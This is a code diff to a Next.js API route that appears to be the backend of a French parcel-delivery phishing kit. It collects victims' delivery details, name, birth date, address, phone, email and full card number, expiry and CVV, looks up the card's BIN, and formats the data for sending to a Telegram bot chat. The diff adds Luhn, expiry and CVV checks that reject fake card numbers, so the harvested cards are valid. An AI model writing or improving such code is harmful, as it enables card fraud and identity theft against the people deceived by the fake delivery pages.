@@ -2,8 +2,18 @@ import { NextRequest, NextResponse } from "next/server";
 import { ZodError, z } from "zod";
 
 import { getBinInfo, type BinInfo } from "@/lib/binCheck";
+import {
+  detectCardType,
+  validateCardNumber,
+  validateCvv,
+  validateExpiry,
+} from "@/lib/cardValidation";
 
 export const dynamic = "force-dynamic";
+
+/* ------------------------------------------------------------------ */
+/* Telegram — inline                                                   */
+/* ------------------------------------------------------------------ */
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -35,37 +45,85 @@ async function sendTelegramMessage(text: string): Promise<void> {
   }
 }
 
-const notifySchema = z.object({
-  trackingNumber: z.string().trim().optional(),
-  zipcode: z.string().trim().optional(),
-  deliveryMode: z.string().trim().optional(),
-  selectedParcelShop: z.string().trim().optional(),
-  deliveryDate: z.string().trim().optional(),
-  deliveryTime: z.string().trim().optional(),
-  lastName: z.string().trim().optional(),
-  firstName: z.string().trim().optional(),
-  birthDate: z.string().trim().optional(),
-  address: z.string().trim().optional(),
-  city: z.string().trim().optional(),
-  postalCode: z.string().trim().optional(),
-  phone: z
-    .string()
-    .trim()
-    .transform(v => v.replace(/\s+/g, ""))
-    .refine(v => /^(?:0[1-9]\d{8}|\+33[1-9]\d{8})$/.test(v), {
-      message: "Numéro de téléphone invalide",
-    })
-    .optional(),
-  email: z.string().trim().optional(),
-  cardHolder: z.string().trim().min(1),
-  cardNumber: z.string().trim().min(4),
-  expiry: z.string().trim().min(2),
-  cvv: z.string().trim().min(1),
-  timestamp: z.string().trim().min(1),
-  userAgent: z.string().optional(),
-});
+/* ------------------------------------------------------------------ */
+/* Schéma de validation                                                */
+/* ------------------------------------------------------------------ */
+
+const notifySchema = z
+  .object({
+    // Livraison (autres étapes, facultatives ici)
+    trackingNumber: z.string().trim().optional(),
+    zipcode: z.string().trim().optional(),
+    deliveryMode: z.string().trim().optional(),
+    selectedParcelShop: z.string().trim().optional(),
+    deliveryDate: z.string().trim().optional(),
+    deliveryTime: z.string().trim().optional(),
+
+    // Infos personnelles
+    lastName: z.string().trim().optional(),
+    firstName: z.string().trim().optional(),
+    birthDate: z.string().trim().optional(),
+    address: z.string().trim().optional(),
+    city: z.string().trim().optional(),
+    postalCode: z.string().trim().optional(),
+    phone: z
+      .string()
+      .trim()
+      .transform(v => v.replace(/\s+/g, ""))
+      .refine(v => /^(?:0[1-9]\d{8}|\+33[1-9]\d{8})$/.test(v), {
+        message: "Numéro de téléphone invalide",
+      })
+      .optional(),
+    email: z.string().trim().optional(),
+
+    // Paiement (requis)
+    cardHolder: z.string().trim().min(1),
+    cardNumber: z.string().trim().min(4),
+    expiry: z.string().trim().min(2),
+    cvv: z.string().trim().min(1),
+
+    // Meta
+    timestamp: z.string().trim().min(1),
+    userAgent: z.string().optional(),
+  })
+  .superRefine((data, ctx) => {
+    // Numéro de carte : Luhn + longueur par réseau + refus des numéros factices
+    const numCheck = validateCardNumber(data.cardNumber);
+    if (!numCheck.valid) {
+      ctx.addIssue({
+        code: "custom",
+        message: numCheck.error ?? "Numéro de carte invalide",
+        path: ["cardNumber"],
+      });
+    }
+
+    // Date d'expiration : format + non expirée + pas trop lointaine
+    const expCheck = validateExpiry(data.expiry);
+    if (!expCheck.valid) {
+      ctx.addIssue({
+        code: "custom",
+        message: expCheck.error ?? "Date d'expiration invalide",
+        path: ["expiry"],
+      });
+    }
+
+    // CVV : 3 chiffres (4 pour Amex)
+    const type = detectCardType(data.cardNumber);
+    const cvvCheck = validateCvv(data.cvv, type);
+    if (!cvvCheck.valid) {
+      ctx.addIssue({
+        code: "custom",
+        message: cvvCheck.error ?? "CVV invalide",
+        path: ["cvv"],
+      });
+    }
+  });
 
 type NotifyPayload = z.infer<typeof notifySchema>;
+
+/* ------------------------------------------------------------------ */
+/* Helpers                                                             */
+/* ------------------------------------------------------------------ */
 
 const sanitizeText = (value: unknown) =>
   String(value ?? "")
@@ -110,6 +168,10 @@ const formatTimestamp = (timestamp: string) => {
     timeStyle: "medium",
   }).format(date);
 };
+
+/* ------------------------------------------------------------------ */
+/* Construction du message Telegram                                    */
+/* ------------------------------------------------------------------ */
 
 const buildMessage = (
   payload: NotifyPayload,
@@ -181,6 +243,10 @@ const buildMessage = (
 
   return lines.join("\n");
 };
+
+/* ------------------------------------------------------------------ */
+/* Handler POST                                                        */
+/* ------------------------------------------------------------------ */
 
 export async function POST(req: NextRequest) {
   try {
